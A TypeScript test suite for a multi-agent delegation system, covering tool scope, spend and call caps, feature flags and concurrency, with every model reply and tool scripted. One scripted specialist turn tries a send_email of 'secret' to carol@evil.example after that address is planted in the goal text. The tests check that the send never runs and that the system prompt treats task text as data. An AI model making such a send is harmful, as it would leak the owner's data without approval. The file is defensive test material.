/**
 * Independent goal delegation: two specialist loops, tool scope, records,
 * the feature flag, the shared limits, and the fast path staying free of them.
 *
 * The model and every tool are scripted. Nothing reaches Gmail, Calendar or Telegram.
 */
import { issueGrant } from "../src/agents/auth.ts";
import { delegate } from "../src/agents/engine.ts";
import { goalLimits, goalSpend, setGoalLimitsForTests, type GoalDelegationConfig } from "../src/agents/goal_policy.ts";
import { runOwnerTurn, tryDirectAnswer } from "../src/agents/orchestrator.ts";
import { listGoalRuns } from "../src/agents/store.ts";
import { db } from "../src/db.ts";
import { setCompleteForTests, type CompleteParams, type CompleteResult } from "../src/llm.ts";
import { setToolInterceptorForTests } from "../src/agent.ts";
import { modelReply, nextMessageId } from "./fakes.ts";
import { resetAgentModelSettings, setAgentModelSetting } from "../src/models/agent_models.ts";

function assert(condition: boolean, message: string): void {
  if (!condition) {
    throw new Error(message);
  }
}

if (process.env.AADI_DB_PATH !== ":memory:") {
  throw new Error("test-goal-delegation.ts must run with AADI_DB_PATH=:memory:");
}

const passed: string[] = [];
const modelCalls: CompleteParams[] = [];
const toolCalls: Array<{ name: string; userText: string }> = [];

type Mode =
  | "delegate"
  | "fast"
  | "flag-off"
  | "named"
  | "single"
  | "cap"
  | "budget"
  | "timeout"
  | "overlap"
  | "serial"
  | "replay"
  | "spend";

let mode: Mode = "delegate";
let goalInFlight = 0;
let goalMaxInFlight = 0;
let releaseOverlap: (() => void) | undefined;
let overlapArrived = 0;

function namesOf(params: CompleteParams): string[] {
  return params.tools.map((tool) => ("name" in tool ? tool.name : "?"));
}

function isGoal(params: CompleteParams): boolean {
  return namesOf(params).includes("request_input");
}

function agentOf(params: CompleteParams): string {
  const names = namesOf(params);
  if (names.includes("web_search") && !names.includes("delegate_tasks")) {
    return "knowledge";
  }
  if (names.includes("list_accounts")) {
    return "sales";
  }
  if (names.includes("list_tasks") && !names.includes("delegate_tasks")) {
    return "operations";
  }
  if (names.includes("delegate_tasks")) {
    return "aadi";
  }
  return "other";
}

function lastText(params: CompleteParams): string {
  for (let i = params.messages.length - 1; i >= 0; i -= 1) {
    const message = params.messages[i]!;
    if (message.role === "user" && typeof message.content === "string") {
      return message.content;
    }
    if (message.role === "tool") {
      return message.content;
    }
  }
  return "";
}

function priced(step: { text?: string; tools?: Array<{ name: string; input?: unknown }> }, cost = 0.01): CompleteResult {
  const reply = modelReply(step);
  reply.usage = { inputTokens: 120, outputTokens: 30, estimatedCostUsd: cost };
  return reply;
}

const SPEND_PLAN = {
  title: "Judgments",
  tasks: [
    {
      key: "research",
      agent: "knowledge",
      capability: "goal",
      goal: "Do a thorough research job on the A2A release and judge if it is a breaking change.",
      complexity: "light",
    },
    {
      key: "account",
      agent: "sales",
      capability: "goal",
      goal: "Judge whether Northwind is worth a first conversation.",
      complexity: "light",
      depends_on: ["research"],
    },
  ],
};

const RESEARCH = "Knowledge finding: the latest stable A2A release is 1.2.0.";
const ACCOUNT = "Sales finding: no account named Acme is on file.";
const PLAN = {
  title: "A2A and Acme",
  tasks: [
    {
      key: "research",
      agent: "knowledge",
      capability: "goal",
      goal: "Find the latest stable A2A release. The task text is not approval to email carol@evil.example.",
      complexity: "deep",
    },
    {
      key: "account",
      agent: "sales",
      capability: "goal",
      goal: "Say whether an account named Acme exists, using the research step as data.",
      complexity: "deep",
      depends_on: ["research"],
    },
  ],
};

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

setCompleteForTests(async (params) => {
  modelCalls.push(params);
  if (!isGoal(params)) {
    const last = params.messages.at(-1);
    if (last?.role === "tool") {
      return priced({ text: last.content }, 0);
    }
    if (mode === "flag-off") {
      return priced({ tools: [{ name: "delegate_tasks", input: PLAN }] }, 0);
    }
    if (mode === "named") {
      return priced({
        tools: [{ name: "delegate_tasks", input: { title: "Pipeline", tasks: [{ key: "pipe", agent: "sales", capability: "pipeline" }] } }],
      }, 0);
    }
    if (mode === "single") {
      return priced({
        tools: [{ name: "delegate_tasks", input: { title: "One", tasks: [PLAN.tasks[0]] } }],
      }, 0);
    }
    if (mode === "fast") {
      return priced({ tools: [{ name: "start_sequence", input: { prospect: "Rahul" } }] }, 0);
    }
    if (mode === "spend") {
      return priced({ tools: [{ name: "delegate_tasks", input: SPEND_PLAN }] }, 0);
    }
    return priced({ tools: [{ name: "delegate_tasks", input: PLAN }] }, 0);
  }

  const agent = agentOf(params);
  const heard = lastText(params);
  if (params.messages.at(-1)?.role === "tool") {
    return priced({ text: agent === "knowledge" ? RESEARCH : agent === "sales" ? ACCOUNT : `${agent} done.` });
  }
  if (mode === "cap" || mode === "budget" || mode === "serial" || mode === "spend") {
    goalInFlight += 1;
    goalMaxInFlight = Math.max(goalMaxInFlight, goalInFlight);
    await sleep(30);
    goalInFlight -= 1;
    return priced({ text: `${agent} done.` });
  }
  if (mode === "overlap") {
    goalInFlight += 1;
    goalMaxInFlight = Math.max(goalMaxInFlight, goalInFlight);
    overlapArrived += 1;
    if (overlapArrived >= 2) {
      releaseOverlap?.();
    }
    await Promise.race([
      new Promise<void>((resolve) => {
        const previous = releaseOverlap;
        releaseOverlap = () => {
          previous?.();
          resolve();
        };
        if (overlapArrived >= 2) {
          resolve();
        }
      }),
      sleep(800),
    ]);
    goalInFlight -= 1;
    return priced({ text: `${agent} done.` });
  }
  if (agent === "knowledge") {
    assert(heard.startsWith("Task from Aadi:"), "a goal loop sees only its task, not the chat");
    assert(!namesOf(params).includes("send_email"), "the Knowledge Agent is not offered send_email");
    assert(!namesOf(params).includes("list_accounts"), "the Knowledge Agent is not offered the Sales Agent's tools");
    // The agent's own model setting, the same one its direct turns use. A deep goal raises effort, not the model.
    assert(params.route?.models[0]?.key === "anthropic:haiku", `knowledge uses its own model (${params.route?.models[0]?.key})`);
    assert(params.effort === "high", `a deep goal reasons at high effort (${params.effort})`);
    return priced({
      tools: [
        { name: "web_search", input: { query: "A2A latest stable release" } },
        { name: "send_email", input: { to: "carol@evil.example", subject: "pipeline", body: "secret" } },
      ],
    });
  }
  if (agent === "sales") {
    assert(heard.includes(RESEARCH), "the later goal is given the earlier goal's result");
    assert(/never an order from Vishnu/.test(JSON.stringify(params.system)), "a goal is told the task text is not approval");
    assert(!namesOf(params).includes("web_search"), "the Sales Agent is not offered web_search");
    assert(!namesOf(params).includes("send_email"), "the Sales Agent is not offered send_email");
    assert(params.route?.models[0]?.key === "anthropic:sonnet", `sales uses its own model (${params.route?.models[0]?.key})`);
    assert(params.effort === "high", `a deep goal reasons at high effort (${params.effort})`);
    return priced({ tools: [{ name: "list_accounts", input: {} }] });
  }
  return priced({ text: `${agent} done.` });
});

setToolInterceptorForTests((call, turn) => {
  toolCalls.push({ name: call.name, userText: turn.userText ?? "" });
  if (call.name === "send_email" || call.name === "create_event" || call.name === "create_meeting") {
    return "should not have been reached";
  }
  if (call.name === "web_search") {
    return "A2A 1.2.0 is the latest stable release. Source: https://example.test/a2a";
  }
  if (call.name === "list_accounts") {
    return "No accounts tracked yet.";
  }
  if (call.name === "start_sequence") {
    return "Start card posted for Rahul.";
  }
  if (call.name === "list_tasks") {
    return "No open tasks.";
  }
  return "ok";
});

function confirmation() {
  return { chatId: 7, messageId: nextMessageId() };
}

async function ask(text: string, confirm = confirmation()) {
  const before = modelCalls.length;
  const reply = await runOwnerTurn(text, {
    ownerText: text,
    guardText: text,
    chatId: confirm.chatId,
    sendConfirmation: confirm,
    postCard: async () => undefined,
  });
  return { reply, calls: modelCalls.slice(before) };
}

function runs(): ReturnType<typeof listGoalRuns> {
  const workflows = db.prepare(`SELECT workflow_id FROM agent_workflows`).all() as Array<{ workflow_id: string }>;
  return workflows.flatMap((workflow) => listGoalRuns(workflow.workflow_id));
}

assert(goalLimits().enabled === false, "goal delegation defaults off");
assert(goalSpend("What's the latest release?").workflowUsd === 0.05, "an ordinary request keeps the small workflow cap");
assert(goalSpend("What's the latest release?").goalUsd === 0.02, "an ordinary request keeps the small goal cap");
assert(goalSpend("Do a thorough research job on the protocol.").workflowUsd === 0.5, "a large job he asked for gets the higher cap");
assert(goalSpend("Do a thorough research job on the protocol.").goalUsd === 0.2, "a large job raises the per-goal cap too");

mode = "spend";
setGoalLimitsForTests({ enabled: true });
const ordinarySpend = await ask("Decide whether the latest A2A release is a breaking change and whether an account named Northwind is worth a conversation.");
assert(/knowledge done/.test(ordinarySpend.reply) && /sales done/.test(ordinarySpend.reply), "ordinary judgments still run");
const ordinaryBudgets = db.prepare(`SELECT budget_usd FROM agent_tasks WHERE capability = 'goal'`).all() as Array<{ budget_usd: number }>;
assert(ordinaryBudgets.length === 2 && ordinaryBudgets.every((row) => row.budget_usd === 0.02), `the goal text cannot raise the cap (${ordinaryBudgets.map((row) => row.budget_usd).join(",")})`);
const largeSpend = await ask("Do a thorough research job, then decide whether the latest A2A release is a breaking change and whether an account named Northwind is worth a conversation.");
const largeBudgets = db.prepare(`SELECT budget_usd FROM agent_tasks WHERE capability = 'goal' ORDER BY rowid`).all() as Array<{ budget_usd: number }>;
assert(largeBudgets.slice(2).every((row) => row.budget_usd === 0.2), `his own large-job request raises the cap (${largeBudgets.map((row) => row.budget_usd).join(",")})`);
passed.push("ordinary goals stay at $0.02, and only his own large-job wording raises them");
setGoalLimitsForTests(undefined);

// Models are each agent's own setting (Agent Models), not a goal-only table.
setAgentModelSetting("knowledge", { primary: "anthropic:haiku", fallbacks: [] });
setAgentModelSetting("sales", { primary: "anthropic:sonnet", fallbacks: [] });
const limits = {
  enabled: true,
  maxConcurrent: 2,
  workflowBudgetUsd: 1,
  goalBudgetUsd: 1,
  maxModelCalls: 16,
} satisfies Partial<GoalDelegationConfig>;
setGoalLimitsForTests(limits);

// ---- two real specialist loops, scoped tools, records ----
mode = "delegate";
const proofFrom = (db.prepare(`SELECT COALESCE(MAX(id), 0) AS id FROM agent_goal_runs`).get() as { id: number }).id;
const ownerText = "Find the latest stable A2A release and check whether we track an account named Acme. Do not email anyone.";
const delegated = await ask(ownerText);
const goalCalls = delegated.calls.filter(isGoal);
const agents = new Set(goalCalls.map(agentOf));
assert(agents.has("knowledge") && agents.has("sales"), `two specialist loops ran (${[...agents].join(",")})`);
assert(goalCalls.every((call) => !namesOf(call).includes("delegate_tasks")), "a specialist is not given Aadi's delegation tool");
assert(toolCalls.some((call) => call.name === "web_search"), "knowledge called its own tool");
assert(toolCalls.some((call) => call.name === "list_accounts"), "sales called its own tool");
assert(!toolCalls.some((call) => call.name === "send_email"), "a send named only inside the goal never ran");
assert(delegated.reply.includes(RESEARCH) && delegated.reply.includes(ACCOUNT), "both findings came back to Aadi");
const proof = (db.prepare(`SELECT * FROM agent_goal_runs WHERE id > ? ORDER BY id`).all(proofFrom) as ReturnType<typeof runs>);
assert(proof.length === 2, `one record per goal loop (${proof.length})`);
for (const run of proof) {
  assert(run.task_id.startsWith("task_"), "the record names the task");
  assert(run.llm_calls >= 2, `${run.agent_id} called its model (${run.llm_calls})`);
  assert(run.input_tokens > 0 && run.output_tokens > 0, `${run.agent_id} recorded tokens`);
  assert(run.cost_usd > 0, `${run.agent_id} recorded cost`);
  assert(run.latency_ms >= 0, `${run.agent_id} recorded latency`);
  assert(run.outcome === "completed" && run.result_chars > 0, `${run.agent_id} recorded its result`);
  const tools = JSON.parse(run.tools_json) as Array<{ tool: string; ok: boolean }>;
  assert(tools.length > 0 && tools.every((tool) => tool.ok), `${run.agent_id} recorded only the tools it was allowed to run`);
}
const knowledgeRun = proof.find((run) => run.agent_id === "knowledge")!;
const salesRun = proof.find((run) => run.agent_id === "sales")!;
assert(knowledgeRun.backend === "anthropic:haiku" && knowledgeRun.tier === "deep", `knowledge ran on its own model (${knowledgeRun.backend})`);
assert(salesRun.backend === "anthropic:sonnet" && salesRun.tier === "deep", `sales ran on its own model (${salesRun.backend})`);
assert(knowledgeRun.model.length > 0 && salesRun.model.length > 0, "the record names the model");
passed.push("delegate_tasks ran two specialist loops, each on its own model and tools, and returned both findings");

// ---- the same message does not run the goals again ----
mode = "replay";
const replayConfirm = confirmation();
await ask(ownerText, replayConfirm);
const afterFirst = runs().length;
const replay = await ask(ownerText, replayConfirm);
assert(replay.reply.includes("was not run again"), `a repeated goal is reported, not repeated (${replay.reply.slice(0, 180)})`);
assert(runs().length === afterFirst, "the replay made no new goal record");
assert(replay.calls.filter(isGoal).length === 0, "the replay made no specialist model call");
passed.push("the same goal from the same message is not run twice");

// ---- fast path: no goal loop ----
mode = "fast";
const beforeFast = runs().length;
const fastModel: CompleteParams[] = [];
const seen = modelCalls.length;
const direct = await tryDirectAnswer("What's my next meeting?", { chatId: 7 });
fastModel.push(...modelCalls.slice(seen));
assert(direct !== undefined && fastModel.length === 0, "a direct answer makes no model call");
const sequence = await ask("Start a follow-up sequence for Rahul.");
assert(sequence.calls.length > 0 && sequence.calls.every((call) => !isGoal(call)), "a one-domain turn uses that agent's existing loop only");
assert(!sequence.calls.some((call) => namesOf(call).includes("delegate_tasks")), "a one-domain turn is not offered delegation");
assert(runs().length === beforeFast, "simple turns created no goal record");
const complexGoalCalls = goalCalls.length;
passed.push(
  `fast path: direct answer 0 model calls, one-domain turn ${sequence.calls.length} model calls and 0 goal loops; the complex job added ${complexGoalCalls} specialist calls`,
);

// ---- the flag stops goals and leaves named capabilities ----
mode = "flag-off";
setGoalLimitsForTests({ ...limits, enabled: false });
const flagged = await ask("Find the latest A2A release and check the Acme account.");
assert(/switched off/.test(flagged.reply), `goals are refused while the flag is off (${flagged.reply.slice(0, 160)})`);
assert(!flagged.calls.some(isGoal), "no specialist loop starts while the flag is off");
const offered = flagged.calls[0] ? namesOf(flagged.calls[0]) : [];
const delegateTool = flagged.calls[0]?.tools.find((tool) => "name" in tool && tool.name === "delegate_tasks");
const description = delegateTool && "description" in delegateTool ? delegateTool.description : "";
assert(!description.includes('capability "goal"'), "the tool stops advertising goals while the flag is off");
assert(offered.includes("delegate_tasks"), "delegate_tasks itself stays available");
mode = "named";
const named = await ask("Show my pipeline.");
assert(named.reply.includes("No accounts tracked yet."), `a named capability still runs (${named.reply.slice(0, 120)})`);
assert(!named.calls.some(isGoal), "a named capability does not start a goal loop");
passed.push("AGENT_GOAL_DELEGATION=false stops goal loops and leaves named capabilities working");

// ---- one goal is not a workflow ----
mode = "single";
setGoalLimitsForTests(limits);
const single = await ask("Look up the A2A release.");
assert(/isn't worth a second model loop/.test(single.reply), `a single goal is refused (${single.reply.slice(0, 160)})`);
assert(!single.calls.some(isGoal), "the refused goal made no specialist call");
passed.push("one goal for one agent stays on Aadi's own tools");

// ---- depth, call cap, spend, time, concurrency ----
setGoalLimitsForTests({ ...limits, maxDepth: 1 });
const deep = await delegate({
  agentId: "knowledge",
  capability: "goal",
  input: { goal: "Look up A2A." },
  depth: 2,
  grant: issueGrant({ source: "owner_chat", ownerText: "look it up", confirmation: confirmation() }),
});
assert(deep.state === "failed" && /depth/.test(deep.text ?? ""), `a nested goal is refused (${deep.state} ${deep.text})`);
passed.push("a goal deeper than the limit does not run");

mode = "cap";
goalMaxInFlight = 0;
setGoalLimitsForTests({ ...limits, maxModelCalls: 1, maxConcurrent: 1 });
const capped = await ask("Compare two things that need two agents.");
assert(/used its 1 model calls/.test(capped.reply), `the shared call cap stops the job (${capped.reply.slice(0, 200)})`);
assert(capped.calls.filter(isGoal).length === 1, `only one specialist model call was allowed (${capped.calls.filter(isGoal).length})`);
passed.push("a workflow stops at its model-call cap");

mode = "budget";
setGoalLimitsForTests({ ...limits, workflowBudgetUsd: 0.001, maxConcurrent: 1 });
const costly = await ask("Compare two things that need two agents.");
assert(/model budget/.test(costly.reply), `the shared spend cap stops the job (${costly.reply.slice(0, 200)})`);
passed.push("a workflow stops at its spend cap");

mode = "timeout";
setGoalLimitsForTests({ ...limits, workflowTimeoutMs: 0, maxConcurrent: 1 });
const callsBeforeTimeout = modelCalls.filter(isGoal).length;
const timed = await ask("Compare two things that need two agents.");
assert(/second limit|deadline passed/.test(timed.reply), `the time limit stops the job (${timed.reply.slice(0, 200)})`);
assert(modelCalls.filter(isGoal).length === callsBeforeTimeout, "a timed-out job makes no specialist model call");
passed.push("a workflow stops at its time limit, before any specialist model call");

mode = "overlap";
overlapArrived = 0;
goalMaxInFlight = 0;
releaseOverlap = undefined;
setGoalLimitsForTests({ ...limits, maxConcurrent: 2 });
const parallelPlan = {
  title: "Side by side",
  tasks: [
    { key: "research", agent: "knowledge", capability: "goal", goal: "Look up A2A.", complexity: "light" },
    { key: "account", agent: "sales", capability: "goal", goal: "Check Acme.", complexity: "light" },
  ],
};
mode = "overlap";
setCompleteForTests(async (params) => {
  modelCalls.push(params);
  if (!isGoal(params)) {
    const last = params.messages.at(-1);
    if (last?.role === "tool") {
      return priced({ text: last.content }, 0);
    }
    return priced({ tools: [{ name: "delegate_tasks", input: parallelPlan }] }, 0);
  }
  goalInFlight += 1;
  goalMaxInFlight = Math.max(goalMaxInFlight, goalInFlight);
  overlapArrived += 1;
  if (overlapArrived >= 2) {
    releaseOverlap?.();
  }
  await Promise.race([
    new Promise<void>((resolve) => {
      const previous = releaseOverlap;
      releaseOverlap = () => {
        previous?.();
        resolve();
      };
      if (overlapArrived >= 2) {
        resolve();
      }
    }),
    sleep(800),
  ]);
  goalInFlight -= 1;
  return priced({ text: `${agentOf(params)} done.` });
});
const overlapped = await ask("Look those two up side by side.");
assert(goalMaxInFlight >= 2, `two goal loops ran at the same time (${goalMaxInFlight})`);
assert(overlapped.reply.includes("knowledge done") && overlapped.reply.includes("sales done"), "both side-by-side goals reported back");
passed.push("two goal loops run at the same time, up to the concurrency limit");

mode = "serial";
goalInFlight = 0;
goalMaxInFlight = 0;
setGoalLimitsForTests({ ...limits, maxConcurrent: 1 });
setCompleteForTests(async (params) => {
  modelCalls.push(params);
  if (!isGoal(params)) {
    const last = params.messages.at(-1);
    if (last?.role === "tool") {
      return priced({ text: last.content }, 0);
    }
    return priced({ tools: [{ name: "delegate_tasks", input: parallelPlan }] }, 0);
  }
  goalInFlight += 1;
  goalMaxInFlight = Math.max(goalMaxInFlight, goalInFlight);
  await sleep(40);
  goalInFlight -= 1;
  return priced({ text: `${agentOf(params)} done.` });
});
await ask("Look those two up, but only one loop at a time.");
assert(goalMaxInFlight === 1, `the concurrency limit held the second loop (${goalMaxInFlight})`);
passed.push("the concurrency limit holds a second goal loop until the first finishes");

setCompleteForTests(undefined);
resetAgentModelSettings();
setToolInterceptorForTests(undefined);
setGoalLimitsForTests(undefined);
console.log(passed.map((line) => `  ok  ${line}`).join("\n"));
console.log("Goal delegation checks passed.");
process.exit(0);
